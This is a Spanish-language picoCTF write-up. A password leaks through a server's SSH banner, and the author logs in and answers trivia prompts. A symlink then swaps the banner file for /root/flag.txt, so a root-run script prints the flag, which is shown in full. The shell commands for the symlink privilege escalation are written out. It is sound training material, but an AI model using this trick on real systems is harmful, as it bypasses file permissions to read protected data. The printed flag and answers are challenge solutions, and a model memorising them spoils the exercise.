
## Descripción

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 55777`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 52272`. From the above information abuse the machine and find the flag in the /root directory.

## Solución

Ingreso al servidor usando el comando nc: 
``` bash
──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 55777
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
Me doy cuenta enseguida que se nos da ahí mismo una contraseña, la información que decribe que se filtra, por lo que la copeo.  
Ingreso al siguiente igual con el comando nc, me pide una contraseña, pruebo la que copié y es correcta. Respondo un par de preguntas que devuelve el servidor hasta que me deja entrar:
```bash
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 53404
*************************************
**************WELCOME****************
*************************************
what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```
Hago un ls y encuentro una pista y el archivo del banner, pista clave. Intento moverme al directorio root y me es posible, donde de hecho encuentro el script.py y la bandera a la cual no puedo acceder por los permisos.
Al analizar el script me encuentro con que leerá el archivo banner, por lo que renombro el banner a banner_backup y también lo hago con la bandera a banner. 
Aquí entra una de las pistas clave del reto. 
```bash
mv banner banner_backup  
ln -s /root/flag.txt banner
```
Ahora mi banner ya no se llama así y lo reemplaza la bandera, que al momento ingresar de nuevo con nc en otra terminal se ejecuta el script e imprime el banner que ahora es la bandera y no el que renombramos, explotamos la vulnerabilidad para leerla sin los permisos.
`picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}`

## Notas adicionales

- Un banner en informática es el primer mensaje que un servidor te envía cuando te conectas. A menudo revela que software y versión está usando.


## Referencias

https://es.wikipedia.org/wiki/Enlace_simb%C3%B3lico